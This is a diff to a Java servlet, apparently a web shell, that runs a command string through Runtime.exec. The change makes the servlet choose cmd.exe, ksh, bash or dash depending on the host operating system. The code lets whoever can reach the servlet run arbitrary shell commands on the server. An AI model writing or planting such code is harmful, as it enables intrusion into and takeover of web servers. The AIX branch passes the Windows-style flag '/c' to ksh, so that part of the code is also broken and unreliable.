@@ -1,5 +1,6 @@
 package com.podalirius;
 
+import org.apache.commons.lang3.SystemUtils;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
@@ -63,6 +64,20 @@ public class MyServlet extends HttpServlet {
         String linebuffer = "";
 
         String[] commands = {"/bin/bash", "-c", cmd};
+
+        if (SystemUtils.IS_OS_WINDOWS) {
+            commands[0] = "cmd.exe";
+            commands[1] = "/c";
+        } else if (SystemUtils.IS_OS_AIX) {
+            commands[0] = "/bin/ksh";
+            commands[1] = "/c";
+        } else if (SystemUtils.IS_OS_LINUX) {
+            commands[0] = "/bin/bash";
+            commands[1] = "-c";
+        } else if (SystemUtils.IS_OS_MAC) {
+            commands[0] = "/bin/dash";
+            commands[1] = "-c";
+        }
 
         try {
             Runtime rt = Runtime.getRuntime();
